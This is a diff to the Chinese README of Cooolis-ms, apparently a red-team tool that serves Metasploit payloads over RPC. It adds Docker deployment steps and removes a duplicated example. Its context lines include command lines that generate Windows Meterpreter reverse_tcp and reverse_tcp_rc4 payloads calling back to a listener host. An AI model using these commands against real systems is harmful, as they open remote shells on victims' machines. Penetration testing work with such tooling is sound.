@@ -29,6 +29,19 @@ Cooolis-ms 是一个支持Metasploit Framework RPC的一个服务端，用于给
 
 ## 如何安装
 
+
+### Docker部署（推荐）
+
+```
+$ git clone https://github.com/Rvn0xsy/Cooolis-ms.git
+$ cd Cooolis-ms/Docker
+$ docker-compose up -d
+```
+
+默认映射监听端口：8899
+
+### 源码部署
+
 ```
 $ git clone https://github.com/Rvn0xsy/Cooolis-ms.git
 $ cd Cooolis-ms
@@ -83,12 +96,6 @@ Cooolis-ms.exe -p windows/meterpreter/reverse_tcp -s LHOST=10.20.56.41,LPORT=887
 ![](img/2020-08-05-12-08-07.png)
 
 Q&A : [是否支持RC4加密的Payload?](https://github.com/Rvn0xsy/Cooolis-ms/issues/6)
-
-* windows/meterpreter/reverse_tcp_rc4：
-
-```
-Cooolis-ms.exe -p windows/meterpreter/reverse_tcp_rc4 -s LHOST=10.20.56.41,LPORT=8876,RC4PASSWORD=rc4_password,Format=dll -H 10.20.56.41 -P 8899
-```
 
 * windows/meterpreter/reverse_tcp_rc4：
 
